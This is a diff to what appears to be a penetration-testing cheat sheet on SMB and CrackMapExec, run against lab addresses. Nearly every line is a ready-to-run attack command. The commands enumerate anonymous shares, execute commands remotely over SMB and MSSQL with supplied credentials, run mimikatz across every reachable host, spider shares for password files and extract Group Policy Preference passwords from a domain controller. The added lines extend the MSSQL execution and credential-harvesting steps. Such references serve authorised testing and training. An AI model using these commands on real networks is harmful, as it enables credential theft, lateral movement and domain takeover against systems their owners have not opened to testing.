@@ -103,15 +103,19 @@ SMB Mount Share
 SMBcacls
   smbcacls -N //10.10.10.97/sharename /folder (Prints out NTFS permissions)
   
-Crackmapexec
+Crackmapexec (https://www.youtube.com/watch?v=Dd4ZAm2mwwA)
   crackmapexec 10.10.10.125 --share -u '' -p '' (View Anonymous SMB Shares)
   cme smb 10.10.10.125 -u username -p 'password' -x whoami (run CMD command, -X for Powershell)
   cme smb 10.10.10.125 -L (View all SMB Modules)
   cme smb 10.10.10.125 -u username -p 'password' -M mimikatz (runs mimikatz on all hosts you have creds for)
+    --otions to see module options
   cme smb 10.10.10.100-125 -u username -p 'password' --shares
     - cme smb DC_IP -u username -p 'password' --spider sharename --pattern pass (searches for password files)
     - cme smb DC_IP -u username -p 'password' --spider sharename --pattern pass --content (searches content for password)
   cme smb DC_IP -u username -p 'password' --groups 'Domain Admins' (displays all domain admins)
+  cme smb DC_IP -u username -p 'password' -M gpp_password (searches DC SYSVOL for GPP passwords)
+  cme mssql SQL_IP -u username -p 'password' -x whoami (executes commands using MSSQL)
+  cme mssql SQL_IP -u username -p 'password' -M mimikatz (executes mimikatz using MSSQL)
   cmedb (CME database)
     proto smb
     creds
